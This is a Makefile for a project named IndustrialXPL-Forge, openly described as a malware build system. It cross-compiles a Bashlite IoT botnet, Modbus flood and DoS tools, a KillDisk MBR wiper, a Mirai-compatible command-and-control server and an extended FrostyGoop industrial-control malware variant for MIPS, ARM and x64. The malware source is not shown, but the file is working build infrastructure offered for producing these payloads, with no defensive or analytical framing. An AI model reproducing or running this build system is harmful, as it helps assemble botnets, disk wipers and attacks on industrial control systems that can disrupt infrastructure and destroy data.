# IndustrialXPL-Forge - Native Payload and Malware Build System
# Compiles C/Go native tools: Bashlite, modbus flood, killdisk, Mirai CnC
#
# Usage:
#   make all          # build everything
#   make bashlite     # compile Bashlite IoT botnet (C, multi-arch)
#   make modbus       # compile Modbus attack tools
#   make mirai-cnc    # compile Mirai-compatible C&C in Go
#   make frostygoop   # compile FrostyGoop Go variant
#   make clean
#
# Requirements:
#   gcc (native + cross-compilers for MIPS/ARM)
#   go 1.21+ (for Go targets)

.PHONY: all bashlite modbus mirai-cnc frostygoop killdisk clean dirs help

OUTDIR   := industrialxpl/resources/payloads
NATDIR   := industrialxpl/modules/cve/malware/_native
CNCD     := industrialxpl/native/go/ixf-mirai-cnc

# Cross-compilers
MIPSEL_CC := mipsel-linux-gnu-gcc
ARM_CC    := arm-linux-gnueabi-gcc
AARCH64_CC := aarch64-linux-gnu-gcc
CC        := gcc

CFLAGS    := -O2 -static -Wall -Wextra -fno-stack-protector
GO        := go

all: dirs bashlite modbus mirai-cnc frostygoop
	@echo "[+] All native payloads built in $(OUTDIR)/"

dirs:
	@mkdir -p $(OUTDIR)/mips $(OUTDIR)/arm $(OUTDIR)/x64 $(OUTDIR)/go

# ============================================================
# Bashlite - IoT Botnet (Telnet brute + DDoS)
# ============================================================
bashlite: dirs
	@echo "[*] Building Bashlite (MIPS, ARM, x64)..."
	@# x64
	$(CC) $(CFLAGS) -o $(OUTDIR)/x64/bashlite_x64 \
		$(NATDIR)/bashlite/bashlite_main.c \
		$(NATDIR)/bashlite/bashlite_scanner.c \
		$(NATDIR)/bashlite/bashlite_attacks.c \
		$(NATDIR)/bashlite/bashlite_util.c \
		-lpthread \
		&& echo "[+] bashlite x64" || echo "[-] bashlite x64 failed"
	@# MIPSEL
	@if command -v $(MIPSEL_CC) >/dev/null 2>&1; then \
		$(MIPSEL_CC) $(CFLAGS) -o $(OUTDIR)/mips/bashlite_mipsel \
			$(NATDIR)/bashlite/bashlite_main.c \
			$(NATDIR)/bashlite/bashlite_scanner.c \
			$(NATDIR)/bashlite/bashlite_attacks.c \
			$(NATDIR)/bashlite/bashlite_util.c \
			-lpthread \
			&& echo "[+] bashlite MIPSEL" || echo "[-] bashlite mipsel failed"; \
	fi
	@# ARM
	@if command -v $(ARM_CC) >/dev/null 2>&1; then \
		$(ARM_CC) $(CFLAGS) -o $(OUTDIR)/arm/bashlite_arm \
			$(NATDIR)/bashlite/bashlite_main.c \
			$(NATDIR)/bashlite/bashlite_scanner.c \
			$(NATDIR)/bashlite/bashlite_attacks.c \
			$(NATDIR)/bashlite/bashlite_util.c \
			-lpthread \
			&& echo "[+] bashlite ARM" || echo "[-] bashlite arm failed"; \
	fi

# ============================================================
# Modbus Attack Tools
# ============================================================
modbus: dirs
	@echo "[*] Building Modbus attack tools..."
	$(CC) $(CFLAGS) -o $(OUTDIR)/x64/modbus_flood_x64 \
		$(NATDIR)/modbus_flood.c \
		&& echo "[+] modbus_flood x64" || echo "[-] modbus_flood failed"
	$(CC) $(CFLAGS) -o $(OUTDIR)/x64/modbus_seig_dos_x64 \
		$(NATDIR)/modbus_seig_dos.c \
		&& echo "[+] modbus_seig_dos x64" || echo "[-] modbus_seig_dos failed"
	$(CC) $(CFLAGS) -o $(OUTDIR)/x64/killdisk_wiper_x64 \
		$(NATDIR)/killdisk_mbr_wiper.c \
		&& echo "[+] killdisk MBR wiper x64" || echo "[-] killdisk failed"

# ============================================================
# Mirai-compatible C&C (Go)
# ============================================================
mirai-cnc: dirs
	@echo "[*] Building IXF Mirai CnC (Go)..."
	@if command -v $(GO) >/dev/null 2>&1; then \
		cd $(CNCD) && \
		$(GO) build -o ../../../../../$(OUTDIR)/go/ixf-mirai-cnc . \
		&& echo "[+] ixf-mirai-cnc built" || echo "[-] mirai cnc build failed"; \
	else \
		echo "[-] Go not found. Install: https://go.dev/dl/"; \
	fi

# ============================================================
# FrostyGoop Extended (Go)
# ============================================================
frostygoop: dirs
	@echo "[*] Building FrostyGoop extended (Go)..."
	@if command -v $(GO) >/dev/null 2>&1; then \
		$(GO) build -o $(OUTDIR)/go/frostygoop_extended \
			$(NATDIR)/frostygoop_extended.go \
			&& echo "[+] frostygoop_extended built" || echo "[-] frostygoop failed"; \
	else \
		echo "[-] Go not found"; \
	fi

clean:
	rm -rf $(OUTDIR)/

check-deps:
	@echo "Checking dependencies..."
	@command -v $(CC) && echo "[+] gcc: OK" || echo "[-] gcc missing"
	@command -v $(MIPSEL_CC) && echo "[+] mipsel gcc: OK" || echo "[-] mipsel: sudo apt install gcc-mipsel-linux-gnu"
	@command -v $(ARM_CC) && echo "[+] arm gcc: OK" || echo "[-] arm: sudo apt install gcc-arm-linux-gnueabi"
	@command -v $(AARCH64_CC) && echo "[+] aarch64 gcc: OK" || echo "[-] aarch64: sudo apt install gcc-aarch64-linux-gnu"
	@command -v $(GO) && echo "[+] Go: OK" || echo "[-] Go missing: https://go.dev/dl/"

help:
	@echo "IndustrialXPL Native Build System"
	@echo ""
	@echo "Targets:"
	@echo "  all         - Build everything"
	@echo "  bashlite    - IoT botnet (MIPS/ARM/x64)"
	@echo "  modbus      - Modbus flood + DoS + MBR wiper (x64)"
	@echo "  mirai-cnc   - Mirai-compatible CnC in Go"
	@echo "  frostygoop  - FrostyGoop extended (Go)"
	@echo "  clean       - Remove built payloads"
	@echo "  check-deps  - Check compiler availability"
	@echo ""
	@echo "Output: industrialxpl/resources/payloads/{mips,arm,x64,go}/"
